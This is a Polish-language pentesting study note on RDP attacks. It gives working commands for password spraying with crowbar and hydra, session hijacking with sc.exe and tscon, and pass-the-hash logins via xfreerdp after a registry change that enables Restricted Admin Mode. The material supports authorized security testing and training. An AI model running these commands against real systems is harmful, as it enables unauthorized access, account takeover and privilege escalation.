# RDP

## 1. Wstęp i Rekonesans

- **RDP (Remote Desktop Protocol):** Własnościowy protokół Microsoftu zapewniający graficzny dostęp (GUI) do zdalnego systemu przez sieć. Często używany przez administratorów oraz MSP do zarządzania wieloma maszynami, przez co stanowi atrakcyjny cel ataków.
- **Domyślny port:** `TCP/3389`.
- **Skanowanie (Nmap):** Wykrycie usługi RDP na hoście:Bash
    
    ```
    nmap -Pn -p3389 192.168.2.143
    ```
    

## 2. Zgadywanie haseł i Password Spraying

- **Błędna konfiguracja:** W rzadkich przypadkach usługa RDP może nie wymagać hasła.
- **Ryzyko blokady konta (Account Lockout):** Na systemach Windows zbyt wiele nieudanych prób logowania na jedno konto może je zablokować lub wyłączyć.
- **Password spraying:** Testowanie **jednego hasła na wielu użytkownikach**, zanim przejdzie się do kolejnego hasła – pozwala uniknąć blokady kont i respektować politykę haseł.

### Narzędzia do password spraying:

- **Crowbar:**Bash
    
    ```
    crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
    ```
    
- **Hydra:**Bash
    
    ```
    hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
    ```
    
    *(Uwaga z logu Hydry: serwery RDP często źle znoszą dużą liczbę równoległych połączeń – warto ograniczać liczbę wątków np. przez `-t 1` lub `-t 4` oraz stosować opóźnienia `-W 1` / `-W 3`, żeby nie przeciążyć usługi).*
    

## 3. Logowanie przez RDP

Po uzyskaniu poprawnych poświadczeń można połączyć się graficznie z poziomu Linuksa za pomocą klientów takich jak **`rdesktop`** lub **`xfreerdp` / `xfreerdp3`**:

Bash

```
rdesktop -u admin -p password123 192.168.2.143
```

*(Przy pierwszym połączeniu z certyfikatem z podpisem własnym / self-signed system zapyta o akceptację certyfikatu).*

## 4. Ataki specyficzne dla protokołu

### A. RDP Session Hijacking (Przejmowanie sesji RDP)

Jeśli mamy konto z uprawnieniami **lokalnego administratora** na maszynie i inny użytkownik ma aktywną sesję RDP, możemy podpiąć się pod jego sesję bez znajomości jego hasła – w środowisku AD może to dać np. uprawnienia Help Desk lub **Domain Admina**.

1. **Uzyskanie uprawnień `SYSTEM`:** Narzędzie `tscon.exe` wymaga uprawnień `SYSTEM`. Mając lokalnego administratora, można uzyskać `SYSTEM` np. przez PsExec, Mimikatz lub tworząc usługę Windows (`sc.exe`), która domyślnie startuje jako Local System.
2. **Sprawdzenie aktywnych sesji i ich ID:**DOS
    
    ```
    query user
    ```
    
    *(Zwraca m.in. nazwę użytkownika, `SESSIONNAME` np. `rdp-tcp#13`, `ID` sesji oraz stan `Active`).*
    
3. **Podpięcie pod sesję przez usługę z `tscon.exe`:**DOS
    
    ```
    sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
    net start sessionhijack
    ```
    
    *(Po uruchomieniu usługi otworzy się konsola w kontekście docelowej sesji).*
    
4. **Ograniczenie:** Metoda ta **nie działa już na Windows Server 2019**.

### B. RDP Pass-the-Hash (PtH)

Jeśli posiadamy **hash NT** użytkownika (np. ze zrzutu bazy SAM) i nie udało się go złamać do postaci jawnego hasła, w określonych przypadkach można zalogować się po RDP za pomocą hasha (np. gdy potrzebny jest dostęp do aplikacji wymagających GUI).

1. **Włączenie Restricted Admin Mode na hoście docelowym:**
Domyślnie wyłączone; bez tego próba PtH zakończy się błędem. Wymaga dodania wartości `DisableRestrictedAdmin` (`REG_DWORD` = `0x0`) w gałęzi `HKLM\System\CurrentControlSet\Control\Lsa`:DOS
    
    ```
    reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
    ```
    
2. **Połączenie z użyciem `xfreerdp` i flagi `/pth`:**Bash
    
    ```
    xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
    ```